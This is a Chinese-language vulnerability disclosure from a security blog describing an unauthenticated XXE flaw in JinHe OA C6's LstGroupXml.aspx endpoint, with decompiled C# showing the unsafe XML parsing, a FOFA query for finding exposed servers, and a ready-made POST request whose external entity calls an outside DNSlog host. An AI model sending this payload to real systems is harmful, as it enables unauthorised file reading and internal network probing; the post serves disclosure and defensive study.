---
title: "金和OA LstGroupXml.aspx XXE漏洞"
source: https://mrxn.net/jswz/jhsoft-LstGroupXml-xxe.html
asset_dir: assets/金和oa-lstgroupxml.aspx-xxe漏洞
---

# 金和OA LstGroupXml.aspx XXE漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2026/1/20 13:31
- 217浏览
- [0评论](#comment)
- 9分钟阅读

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `LstGroupXml.aspx` 接口处存在[XXE](https://mrxn.net/tag/XXE)漏洞，未授权的攻击者可以通过此漏洞读取服务器上敏感文件或探测内网服务信息，进一步利用可导致服务器失陷。

漏洞预警服务

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

直接根据 `LstGroupXml.aspx` 在 `bin` 目录下查找 `JHSoft.Web.Groups.dll` 将其进行反编译后找到 **LstGroupXml** 的处理逻辑

```
protected void Page_Load(object sender, EventArgs e)
{
  string end = ((TextReader) new StreamReader(this.Request.InputStream)).ReadToEnd();
  XmlDocument xmlDocument = new XmlDocument();
  xmlDocument.LoadXml(end);
```

请求内容直接使 `XmlDocument.LoadXml` 解析，造成[XXE](https://mrxn.net/tag/XXE)漏洞。

# 漏洞复现

> 另一个 JHSoft.Web.govsetaip/LstGroupXml.aspx 接口也存在同样的漏洞
>
> 网络安全

```
POST /c6/Jhsoft.Web.groups/LstGroupXml.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://xxe.dnslog.pt/xxe_test">
%remote;]>
<root/>
```

在DNSLOG平台成功收到请求

[![金和OA LstGroupXml.aspx XXE漏洞](images/img-001-ab40f77f1ff8.webp)](https://image.mrxn.net/b12efeef8c1a4140adbccbbbda98c37e.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#0day](https://mrxn.net/tag/0day)
- [#XXE](https://mrxn.net/tag/XXE)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
